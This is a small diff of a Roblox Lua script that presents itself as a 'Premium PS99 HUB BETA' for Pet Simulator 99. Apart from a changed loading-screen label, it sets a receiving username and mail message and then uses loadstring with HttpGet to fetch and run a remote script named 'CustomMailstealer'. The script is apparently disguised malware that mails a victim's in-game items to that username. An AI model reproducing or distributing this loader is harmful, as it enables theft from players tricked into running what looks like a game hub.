@@ -1,5 +1,5 @@
 Username = "Panibughomist"
-G_LoadingScreen = "Loading Premium PS99 HUB BETA"
+G_LoadingScreen = "Premium PS99 HUB BETA"
 G_Mailmessage = "goodshit"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
